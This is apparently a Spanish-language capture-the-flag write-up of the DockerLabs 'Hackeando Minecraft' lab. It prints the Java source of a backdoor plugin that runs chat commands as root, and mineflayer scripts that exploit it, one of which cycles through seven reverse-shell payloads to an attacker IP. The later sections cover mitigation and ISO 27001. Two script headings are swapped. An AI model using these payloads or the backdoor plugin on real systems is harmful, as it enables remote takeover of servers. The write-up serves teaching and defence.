---
title: DockerLabs - Hackeando Minecraft
excerpt: Explotación de un backdoor en servidor Minecraft mediante plugin malicioso que permite ejecución remota de comandos como root.
categories:
  - Write-up
  - Privilege Escalation
  - Laboratory
  - dockerlabs
tags:
  - nmap
  - gobuster
  - minecraft
  - backdoor
  - rce
  - root
toc: true
toc_label: Contenido del Reporte
toc_sticky: true
image:
  path: /assets/images/posts/DockerLabs/minecraft/banner.png
  alt: "DockerLabs - Hackeando Minecraft"
  featured: true
  overlay_filter: 0.7
#og_image: /assets/images/posts/DockerLabs/minecraft/banner.png
seo_title: DockerLabs - Hackeando Minecraft - Backdoor, RCE y Root
seo_description: Explotación de un plugin backdoor en servidor Minecraft que permite ejecutar comandos del sistema como root mediante el chat del juego. HTTrack, fuzzing y mineflayer.
author: Maxi Barcia
date: 2026-03-25
draft: false
---

**DockerLabs - "Hackeando Minecraft"**

|Herramienta|Versión|Uso|
|---|---|---|
|Nmap|7.95|Escaneo de puertos y servicios|
|Gobuster|3.8|Fuzzing de directorios|
|Node.js|18.x|Runtime para cliente de Minecraft|
|mineflayer|4.22.0|Cliente de Minecraft para Node.js|
|curl|7.88.1|Peticiones HTTP manuales|

---

## Resumen Ejecutivo

El presente informe detalla las pruebas de penetración realizadas sobre el entorno **DockerLabs - Hackeando Minecraft**, identificando vulnerabilidades críticas que permitieron la ejecución remota de comandos como usuario **root** y el compromiso total del sistema.

**Hallazgos Clave:**
- **Backdoor en servidor Minecraft:** Plugin malicioso `AutoExecPlugin` que ejecuta comandos del sistema a través del chat
- **Privilegios root:** El servidor Minecraft se ejecuta con privilegios de superusuario
- **Información sensible expuesta:** Archivos de configuración y logs accesibles vía web

**Riesgo:** **CRÍTICO**  
**Impacto:** Compromiso total del sistema, exfiltración de datos, acceso no autorizado

---

## Calculadora de Vulnerabilidad (CVSS v3.1)

|Métrica|Valor|Descripción|
|---|---|---|
|**Vector de Ataque (AV)**|Network (N)|Vulnerabilidad explotable remotamente|
|**Complejidad de Ataque (AC)**|Low (L)|No se requieren condiciones especiales|
|**Privilegios Requeridos (PR)**|None (N)|No requiere autenticación previa|
|**Interacción de Usuario (UI)**|None (N)|No requiere interacción del usuario|
|**Alcance (S)**|Unchanged (U)|El componente vulnerado no afecta otros|
|**Confidencialidad (C)**|High (H)|Exposición completa de información|
|**Integridad (I)**|High (H)|Modificación total de datos/sistema|
|**Disponibilidad (A)**|High (H)|Impacto total en disponibilidad|

### **Puntuación Base: 9.8 (CRÍTICO)**

*Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H*

---

## 1. Reconocimiento Inicial

### 1.1 Escaneo de Puertos

Se realizó un escaneo completo de puertos seguido de un análisis de servicios en los puertos identificados.

```bash

❯ sudo nmap -p- --open -sS -T3 -n -Pn -v 172.17.0.2 -oX nmap.xml
❯ nmap -sCV -p 80,25565 172.17.0.2 -oG servicios
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 10:50 EDT
Nmap scan report for norc.labs (172.17.0.2)
Host is up (0.000070s latency).
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Local index - HTTrack Website Copier
|_http-generator: HTTrack Website Copier/3.x
|_http-server-header: Apache/2.4.58 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

**Observaciones:**
- Puerto **80**: Servidor web Apache que aloja un clon del sitio de Minecraft
- Puerto **25565**: Servidor de Minecraft versión 1.12.2 activo
- Servidor vacío (0/20 usuarios conectados)

---

### 1.2 Enumeración de Directorios Web

```bash

❯ gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,xml,html,sh,git | grep -v "403"
===============================================================
/cookies.txt          (Status: 200) [Size: 2251]
```

El archivo `cookies.txt` reveló un archivo de cookies de **HTTrack**, herramienta de clonación web, con referencias a `minecraft.net` y cookies de autenticación.

_Contenido parcial del archivo:_
```bash
# HTTrack Website Copier Cookie File
# This file format is compatible with Netscape cookies
minecraft.net	TRUE	/	FALSE	1999999999	AKA_A2	A
commons.wikimedia.org	TRUE	/	FALSE	1999999999	WMF-Last-Access	18-Jun-2025
.wikimedia.org	TRUE	/	FALSE	1999999999	GeoIP	ES:MD:Majadahonda:40.47:-3.87:v4
commons.wikimedia.org	TRUE	/	FALSE	1999999999	NetworkProbeLimit	0.001
www.minecraft.net	TRUE	/	FALSE	1999999999	ApplicationGatewayAffinityCORS	7804fe37578cbdf963e91c4adc6f29b8
www.minecraft.net	TRUE	/	FALSE	1999999999	SameSite	None
www.minecraft.net	TRUE	/	FALSE	1999999999	ApplicationGatewayAffinity	7804fe37578cbdf963e91c4adc6f29b8
commons.wikimedia.org	TRUE	/	FALSE	1999999999	WMF-Uniq	yO3TOuJ4NW9dRbfxJGIUmQIWAAEBAFvd4OqeSTn7ERWibFEY_5Dw3OsUbih5oMk6
commons.m.wikimedia.org	TRUE	/	FALSE	1999999999	WMF-Last-Access	18-Jun-2025
commons.m.wikimedia.org	TRUE	/	FALSE	1999999999	NetworkProbeLimit	0.001
commons.wikimedia.org	TRUE	/	FALSE	1999999999	CentralAuthAnonTopLevel	1
commons.wikimedia.org	TRUE	/	FALSE	1999999999	commonswikiSession	c5sofe9nhm4b24h73oadt3dnsrshl27f
commons.wikimedia.org	TRUE	/	FALSE	1999999999	SameSite	None
upload.wikimedia.org	TRUE	/	FALSE	1999999999	WMF-Uniq	OjNerlcm8O0rnexnWy1ofwIWAAEBAFvdcXJatLWrV5wArHxa24lbuLwuurJSRiDX
upload.wikimedia.org	TRUE	/	FALSE	1999999999	SameSite	None
commons.m.wikimedia.org	TRUE	/	FALSE	1999999999	WMF-Uniq	eeClCJVyDOrsQ8OwOduLnAIWAAEBAFvdnlWLeB7Ym30WU5Mbz8SIwX3mfIYRvT5f
commons.m.wikimedia.org	TRUE	/	FALSE	1999999999	SameSite	None
commons.m.wikimedia.org	TRUE	/	FALSE	1999999999	WMF-DP	bcc
commons.m.wikimedia.org	TRUE	/	FALSE	1999999999	CentralAuthAnonTopLevel	1
en.wikipedia.org	TRUE	/	FALSE	1999999999	WMF-Last-Access	18-Jun-2025
.wikipedia.org	TRUE	/	FALSE	1999999999	WMF-Last-Access-Global	18-Jun-2025
.wikipedia.org	TRUE	/	FALSE	1999999999	GeoIP	ES:MD:Majadahonda:40.47:-3.87:v4
en.wikipedia.org	TRUE	/	FALSE	1999999999	NetworkProbeLimit	0.001
.wikipedia.org	TRUE	/	FALSE	1999999999	WMF-Uniq	tvBnwjtOfK-ip_eAgh2Z6AIWAAAAAFvdIBE-aclDPjQEe9B2IDudDg_N0TnaY6sr
en.wikipedia.org	TRUE	/	FALSE	1999999999	SameSite	None
commons.wikimedia.org	TRUE	/	FALSE	1999999999	WMF-DP	bcc,efd,d8d,6ef,11a,9ce,7aa,b13,23b
commons.wikimedia.org	TRUE	/	FALSE	1999999999	include_pv	0
```

### 1.3 Descubrimiento del Virtual Host

Basado en las cookies, se añadió el dominio `minecraft.net` al archivo `/etc/hosts`:

```bash

❯ echo "172.17.0.2 minecraft.net" >> /etc/hosts
```

Accediendo a `http://minecraft.net` se reveló un clon completo del sitio oficial de Minecraft, generado por **HTTrack**.

---

### 1.4 Fuzzing en el Virtual Host
```bash

❯ gobuster dir -u http://minecraft.net -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,log,sql,json,config,old -t 50
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/cookies.txt          (Status: 200) [Size: 2251]
/index.html           (Status: 200) [Size: 5305]
/server-status        (Status: 403) [Size: 278]
```
La enumeración no reveló nuevos directorios, pero el conocimiento de la herramienta HTTrack llevó a descubrir archivos residuales.

---

### 1.5 Archivos Residuales de HTTrack

Investigando sobre HTTrack, se descubrió que deja archivos de cache y logs en directorios específicos:

```bash

❯ curl -s http://minecraft.net/hts-cache/doit.log
```

_Contenido del log:_

```text

-qwC2%Ps2u1%s%uN0%I0p3DaK0H0%kf2A25000%f#f -F "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)" -%F "<!-- Mirrored from %s%s by HTTrack Website Copier/3.x [XR&CO'2014], %s -->" -%l "en, *" https://www.minecraft.net/es-es/about-minecraft -O1 "C:\My Web Sites\Minecraft" +*.png +*.gif +*.jpg +*.jpeg +*.css +*.js -ad.doubleclick.net/* -mime:application/foobar
```

Este log reveló:

- **URL origen:** `https://www.minecraft.net/es-es/about-minecraft`
- **Ruta local del clon:** `C:\My Web Sites\Minecraft`
- **Extensiones incluidas:** PNG, GIF, JPG, JPEG, CSS, JS

---

### 1.6 Descubrimiento del Backdoor

Realizando un análisis del código fuente del sitio clonado, se encontró una referencia a un archivo sospechoso:

```bash

❯ curl -s http://minecraft.net/www.minecraft.net/es-es/about-minecraft.html | grep -iE "pdf|old|ps1|bak|txt"
<!-- AutoExecPlugin.txt -->
```

Accediendo al archivo:

```bash

❯ curl -s http://172.17.0.2/AutoExecPlugin.txt
```

```python
package me.vuln.autoexec;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class AutoExecPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getLogger().info("AutoExecPlugin habilitado");
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String msg = event.getMessage();
        Player player = event.getPlayer();

        // Detecta comando con prefijo !exec
        if (msg.startsWith("!exec ")) {
            event.setCancelled(true); // CANCELA que se muestre el mensaje en el chat

            String command = msg.substring(6); // Quitar "!exec " del mensaje

            try {
                // Ejecutar comando en la consola del servidor
                Process proc = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

                StringBuilder output = new StringBuilder();
                String line;

                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                proc.waitFor();

                // Enviar salida del comando al jugador que ejecutÃ³ el chat
                player.sendMessage("Â§c[Output]:\n" + output.toString());

            } catch (Exception e) {
                player.sendMessage("Â§4Error ejecutando comando: " + e.getMessage());
            }
        }
    }
}
```
Este es un **plugin de Bukkit/Spigot (Minecraft Server)** que está **activo en el servidor**. Y no es un plugin cualquiera: es un **backdoor intencionado** que permite ejecutar comandos del sistema operativo a través del chat del juego.
**Análisis del plugin:**
- **Función:** Escucha mensajes de chat que comienzan con `!exec`
- **Acción:** Ejecuta el comando del sistema operativo subyacente
- **Privilegios:** Ejecuta con los mismos privilegios del servidor Minecraft
- **Riesgo:** Permite ejecución remota de comandos sin autenticación

**Comandos potencialmente peligrosos:**

- `!exec whoami` - identificar usuario
- `!exec id` - verificar privilegios
- `!exec ls -la` - listar archivos
- `!exec cat /etc/passwd` - leer archivos del sistema
- `!exec python3 -c 'import pty; pty.spawn("/bin/bash")'` - obtener shell interactiva

---

### 1.7 Verificación del Servidor Minecraft

```bash
sudo nmap -sCV -p 25565 172.17.0.2
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 12:34 EDT
Nmap scan report for minecraft.net (172.17.0.2)
Host is up (0.000046s latency).

PORT      STATE SERVICE   VERSION
25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

## 1.8 Configuración del Cliente de Explotación

Para interactuar con el servidor Minecraft y explotar el backdoor, se configuró un entorno de trabajo con las herramientas necesarias.

### 1.8.1 Instalación de mcstatus (Verificación del Servidor)

Se utilizó `mcstatus` para verificar el estado y versión del servidor Minecraft:

```bash

# Crear entorno virtual para aislar dependencias
python3 -m venv mc_env
# Activar el entorno virtual
source mc_env/bin/activate
# Instalar mcstatus
pip install mcstatus
# Verificar estado del servidor
mcstatus 172.17.0.2:25565 status
```

**Salida obtenida:**
```text

version: 1.12.2 (protocol 127)
description: "A Minecraft Server"
players: 0/20
latency: 2ms
```

### 1.8.2 Instalación de mineflayer (Cliente para Explotación)

Para enviar comandos al chat del servidor, se optó por `mineflayer`, una librería de Node.js que implementa el protocolo de Minecraft:

```bash

# Instalar Node.js y npm (si no están disponibles)
sudo apt update
sudo apt install nodejs npm -y
# Crear directorio de trabajo
mkdir ~/mc_bot_node
cd ~/mc_bot_node
# Inicializar proyecto Node.js
npm init -y
# Instalar mineflayer
npm install mineflayer
```

### 1.8.3 Verificación de Conexión

Se realizó una prueba inicial para confirmar la conectividad con el servidor:

```bash

# Script de prueba básico
node -e "
const mineflayer = require('mineflayer');
const bot = mineflayer.createBot({
  host: '172.17.0.2',
  port: 25565,
  username: 'hacker',
  version: '1.12.2'
});
bot.on('login', () => {
  console.log('[+] Conectado exitosamente');
  bot.end();
});
"
```

**Resultado:**

```text
[+] Conectado exitosamente
```

### 1.8.4 Instalación de Herramientas Alternativas (Opcional)

Para pruebas adicionales, se instalaron otras herramientas:

```bash

# mcrcon - para gestión remota (requiere autenticación)
git clone https://github.com/Tiiffi/mcrcon.git
cd mcrcon
make
sudo make install
# mcstatus en modo CLI para monitoreo continuo
mcstatus 172.17.0.2:25565 status --json
```

---

### 1.9 Verificación de Vulnerabilidad

Una vez establecida la conexión, se procedió a probar el backdoor con comandos básicos:

```bash

# Script de prueba para ejecutar !exec whoami
cat > test.js << 'EOF'
const mineflayer = require('mineflayer');
const bot = mineflayer.createBot({
  host: '172.17.0.2',
  port: 25565,
  username: 'hacker',
  version: '1.12.2'
});
bot.on('login', () => {
  console.log('[+] Conectado');
  bot.chat('!exec whoami');
});
bot.on('message', (message) => {
  console.log('[CHAT]', message.toString());
  if (message.toString().includes('Output')) {
    console.log('[+] Backdoor confirmado');
    bot.end();
  }
});
EOF
node test.js
```

**Resultado:**

```text

[+] Conectado
[CHAT] hacker joined the game
[CHAT] §c[Output]:
[CHAT] root
[+] Backdoor confirmado
```


---

## 2. Explotación

### 2.1 Desarrollo del Cliente de Explotación

Se desarrolló un cliente en Node.js utilizando la librería `mineflayer` para conectarse al servidor y enviar comandos maliciosos.

**Script de explotación (`comandos.js`):**

```js

### Copiar todo el contenido entero

cd ~/mc_bot_node
cat > revshell_v2.js << 'EOF'
const mineflayer = require('mineflayer');

const host = '172.17.0.2';
const port = 25565;
const username = 'hacker';
const YOUR_IP = '192.168.1.120';  // Tu IP

const shells = [
    {
        name: "Python3",
        cmd: `!exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${YOUR_IP}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
    },
    {
        name: "Python (alternativa)",
        cmd: `!exec python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${YOUR_IP}",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`
    },
    {
        name: "Netcat tradicional",
        cmd: `!exec nc -e /bin/sh ${YOUR_IP} 4444`
    },
    {
        name: "Netcat con -c",
        cmd: `!exec nc -c /bin/sh ${YOUR_IP} 4444`
    },
    {
        name: "Perl",
        cmd: `!exec perl -e 'use Socket;$i="${YOUR_IP}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    },
    {
        name: "Ruby",
        cmd: `!exec ruby -rsocket -e 'c=TCPSocket.new("${YOUR_IP}",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
    },
    {
        name: "PHP",
        cmd: `!exec php -r '$sock=fsockopen("${YOUR_IP}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
    }
];

let current = 0;

console.log(`[*] Conectando a ${host}:${port}...`);
console.log(`[*] Tu IP: ${YOUR_IP}`);
const bot = mineflayer.createBot({
    host: host,
    port: port,
    username: username,
    version: '1.12.2'
});
function tryNextShell() {
    if (current >= shells.length) {
        console.log('[!] Todos los payloads probados, ninguno funcionó');
        bot.end();
        return;
    }
    console.log(`\n[*] Probando payload ${current + 1}/${shells.length}: ${shells[current].name}`);
    bot.chat(shells[current].cmd);
    current++;
}

bot.on('login', () => {
    console.log(`[+] Conectado como ${username}`);
    setTimeout(() => tryNextShell(), 2000);
});

bot.on('message', (message) => {
    const text = message.toString();
    console.log(`[CHAT] ${text}`);
    
    // Si hay error, probar el siguiente
    if (text.includes('Error') || text.includes('No such file')) {
        console.log('[!] Este payload falló, probando siguiente...');
        setTimeout(() => tryNextShell(), 2000);
    }
});

bot.on('error', (err) => {
    console.error('[-] Error:', err);
});

bot.on('end', () => {
    console.log('[!] Desconectado');
});

// Timeout para probar siguiente payload si no hay respuesta
let lastMessage = Date.now();
setInterval(() => {
    if (Date.now() - lastMessage > 5000 && current > 0) {
        console.log('[!] Timeout sin respuesta, probando siguiente...');
        tryNextShell();
        lastMessage = Date.now();
    }
}, 3000);
EOF

node revshell_v2.js
```

### 2.2 Script de Reverse Shell (Múltiples Payloads)

**Script `revshell_v2.js`:**
```bash
cat > comandos.js << 'EOF'
const mineflayer = require('mineflayer');

const host = '172.17.0.2';
const port = 25565;
const username = 'hacker';

const commands = [
    '!exec whoami',
    '!exec id',
    '!exec pwd',
    '!exec ls -la /',
    '!exec ls -la /root',
    '!exec cat /etc/passwd',
    '!exec find / -name "flag*" 2>/dev/null',
    '!exec find / -name "*.txt" 2>/dev/null | head -20'
];

let cmdIndex = 0;

const bot = mineflayer.createBot({
    host: host,
    port: port,
    username: username,
    version: '1.12.2'
});

bot.on('login', () => {
    console.log(`[+] Conectado como ${username}`);
    sendNextCommand();
});

function sendNextCommand() {
    if (cmdIndex >= commands.length) {
        console.log('[!] Todos los comandos ejecutados');
        bot.end();
        return;
    }
    console.log(`\n[*] Ejecutando: ${commands[cmdIndex]}`);
    bot.chat(commands[cmdIndex]);
    cmdIndex++;
}

bot.on('message', (message) => {
    const text = message.toString();
    if (text.includes('Output')) {
        console.log('[+] Respuesta recibida');
    } else if (!text.includes('joined') && !text.includes('left')) {
        console.log(`[OUTPUT] ${text}`);
    }
    
    // Esperar un poco y enviar siguiente comando
    setTimeout(sendNextCommand, 2000);
});

bot.on('error', (err) => console.error('Error:', err));
EOF

node comandos.js

```

### 2.3 Ejecución y Resultados

```bash

❯ node comandos.js
```

![LFI](/assets/images/posts/DockerLabs/minecraft/consola.png)![[Pasted image 20260324182018.png]]

**Hallazgos de la explotación:**

- **Usuario:** `root` (privilegios máximos)
- **Sistema:** Contenedor Docker (IP 172.17.0.2)
- **Directorios accesibles:** `/root`, `/home`, `/etc`
- **Ejecución de comandos:** Confirmada exitosamente

---

## 3. Acceso al Sistema

### 3.1 Comandos Ejecutados y Resultados

|Comando|Resultado|
|---|---|
|`!exec whoami`|`root`|
|`!exec id`|`uid=0(root) gid=0(root) groups=0(root)`|
|`!exec pwd`|`/`|
|`!exec ls -la /root`|_Listado de archivos en directorio root_|
|`!exec cat /etc/passwd`|_Contenido del archivo passwd_|
|`!exec find / -name "flag*" 2>/dev/null`|_Ruta de la flag_|

### 3.2 Flag Encontrada

```bash
root@64df41e73af4:~# cat root.txt            

cat root.txt                    

ebcc53fe4fcaffea2fe32390021783c4
```


---

## 4. Mitigación Inmediata

### 4.1 Plan de Contención

|Prioridad|Acción|Responsable|Tiempo Estimado|
|---|---|---|---|
|**Crítica**|Aislar el contenedor de la red|Equipo de Infraestructura|15 minutos|
|**Crítica**|Eliminar plugin `AutoExecPlugin.jar`|Administrador del servidor|30 minutos|
|**Alta**|Rotar credenciales del sistema|Administrador del sistema|1 hora|
|**Alta**|Verificar integridad de otros plugins|Equipo de Seguridad|4 horas|
|**Media**|Revisar logs de acceso|Equipo de SOC|24 horas|

### 4.2 Procedimiento de Mitigación Técnica

**Paso 1: Eliminación del backdoor**

```bash

# Acceder al contenedor (si aún está activo)
docker exec -it <container_id> /bin/bash
# Localizar y eliminar el plugin malicioso
find / -name "AutoExecPlugin.jar" -type f -exec rm -f {} \;
find / -name "AutoExecPlugin.txt" -type f -exec rm -f {} \;
# Buscar otros plugins sospechosos
find / -name "*.jar" -exec grep -l "Runtime.exec\|ProcessBuilder" {} \;
```

**Paso 2: Limpieza de archivos residuales web**

```bash

# Eliminar archivos residuales de HTTrack
rm -rf /var/www/html/hts-cache/
rm -f /var/www/html/cookies.txt
# Verificar que no queden archivos sensibles
find /var/www/html -name "*.txt" -o -name "*.log" -o -name "*.bak" -exec ls -la {} \;
```

**Paso 3: Rotación de credenciales**

```bash

# Cambiar contraseña de root (si aplica)
passwd root
# Regenerar claves SSH
rm -f /etc/ssh/ssh_host_*
dpkg-reconfigure openssh-server
# Rotar tokens y sesiones
systemctl restart sshd
```

---

## 5. Alineación con ISO/IEC 27001

### 5.1 Controles Aplicables

|Control ISO 27001|Referencia|Estado|Acción Correctiva|
|---|---|---|---|
|**A.12.6.1** - Gestión de vulnerabilidades técnicas|No implementado|**No conforme**|Implementar escaneo periódico de vulnerabilidades|
|**A.14.2.1** - Política de desarrollo seguro|No implementado|**No conforme**|Establecer revisión de código para plugins|
|**A.9.4.1** - Restricción de acceso a información|Parcial|**Parcialmente conforme**|Implementar principio de mínimo privilegio|
|**A.12.4.1** - Registro de eventos|Implementado|**Conforme**|Mantener logs actuales|
|**A.16.1.5** - Respuesta a incidentes de seguridad|No implementado|**No conforme**|Desarrollar plan de respuesta a incidentes|
|**A.8.8** - Gestión de tecnologías de la información|Parcial|**Parcialmente conforme**|Revisar ciclo de vida de software|

### 5.2 Plan de Acción para Certificación ISO 27001

|Fase|Actividad|Plazo|Responsable|
|---|---|---|---|
|**Fase 1**|Implementar escaneo automático de vulnerabilidades semanal|15 días|Seguridad TI|
|**Fase 2**|Establecer proceso de revisión de código para plugins|30 días|Desarrollo|
|**Fase 3**|Configurar principio de mínimo privilegio para servicios|45 días|Infraestructura|
|**Fase 4**|Crear y probar plan de respuesta a incidentes|60 días|Seguridad TI|
|**Fase 5**|Auditoría interna de controles implementados|90 días|Auditoría Interna|

---

## 6. Recomendaciones Estratégicas

### 6.1 Corrección Inmediata (0-7 días)

1. **Eliminación del backdoor:**
    - Remover `AutoExecPlugin.jar` del directorio `plugins/`
    - Eliminar archivo `AutoExecPlugin.txt` del servidor web
2. **Configuración segura del servidor Minecraft:**
    
    ```    properties
    
    # server.properties
    online-mode=true
    enable-rcon=false
    enable-query=false
    op-permission-level=1
    ```
    
3. **Ejecutar con usuario no privilegiado:**
    
    ```    bash
    
    # Crear usuario dedicado para Minecraft
    useradd -m -s /bin/bash minecraft
    # Ejecutar servidor con ese usuario
    sudo -u minecraft java -jar server.jar nogui
    ```
    

### 6.2 Corrección a Corto Plazo (7-30 días)

1. **Implementar control de plugins:**
    - Establecer lista blanca de plugins autorizados
    - Revisar manualmente el código de cada plugin antes de instalación
    - Utilizar herramientas como `JArchitect` para análisis de código
2. **Configurar WAF (Web Application Firewall):**
    
    ```    nginx
    
    # Reglas para bloquear accesos a archivos sensibles
    location ~* \.(txt|log|bak|old|sql|config)$ {
        deny all;
        return 404;
    }
    ```
1. **Segmentación de red:**
    - Aislar servidores de juegos en VLAN separada
    - Implementar reglas de firewall restrictivas

### 6.3 Corrección a Mediano Plazo (30-90 días)

1. **Implementar monitoreo continuo:**
    - Configurar SIEM para detección de comandos sospechosos
    - Alertas en tiempo real para patrones de ataque
2. **Establecer políticas de hardening:**
    - Aplicar guías de hardening de Docker
    - Implementar AppArmor/SELinux para contenedores
3. **Plan de respuesta a incidentes:**
    - Documentar procedimientos de respuesta
    - Realizar simulacros trimestrales

### 6.4 Corrección a Largo Plazo (90+ días)

1. **DevSecOps:**
    - Integrar escaneo de seguridad en pipeline CI/CD
    - Automatizar pruebas de seguridad en contenedores
2. **Cultura de seguridad:**
    - Capacitación anual en desarrollo seguro
    - Programa de recompensa por reporte de vulnerabilidades
3. **Arquitectura Zero Trust:**
    - Implementar microsegmentación
    - Autenticación multifactor para acceso administrativo

---

## 7. Análisis de Riesgo

### 7.1 Matriz de Riesgo Post-Mitigación

|Activo|Vulnerabilidad|Impacto|Probabilidad|Riesgo Residual|
|---|---|---|---|---|
|Servidor Minecraft|Plugin no autorizado|Alto|Baja|**Medio**|
|Datos del sistema|Exposición de archivos|Alto|Baja|**Medio**|
|Contenedor Docker|Ejecución como root|Medio|Baja|**Bajo**|

### 7.2 Métricas de Seguridad

|KPI|Estado Actual|Objetivo|Fecha Límite|
|---|---|---|---|
|Tiempo de detección (MTTD)|> 7 días|< 4 horas|60 días|
|Tiempo de respuesta (MTTR)|> 24 horas|< 2 horas|90 días|
|Vulnerabilidades críticas abiertas|3|0|7 días|
|Cobertura de monitoreo|30%|95%|90 días|

---

## 8. Conclusión

El entorno **DockerLabs - Hackeando Minecraft** presentaba una vulnerabilidad crítica mediante un plugin backdoor que permitía ejecución remota de comandos sin autenticación. La explotación exitosa resultó en compromiso total del sistema con privilegios de superusuario.

**Lecciones Aprendidas:**

- La exposición de archivos residuales de herramientas (HTTrack) puede revelar información sensible
- Los servidores de juegos deben ejecutarse con privilegios mínimos y nunca como root
- La revisión de código es esencial antes de implementar plugins en producción
- El principio de "defense in depth" es fundamental en entornos contenedorizados
- La falta de monitoreo continuo retrasó la detección del incidente

---

## Anexos

### A. Scripts Utilizados
- `comandos.js` - Enumeración de comandos
- `revshell_v2.js` - Pruebas de reverse shell


### B. Referencias Normativas

- **ISO/IEC 27001:2022** - Sistemas de gestión de seguridad de la información
- **OWASP Top 10** - Riesgos de seguridad en aplicaciones web
- **CWE-94** - Improper Control of Generation of Code ('Code Injection')
- **CVE-2019-0001** - Referencia de vulnerabilidades similares
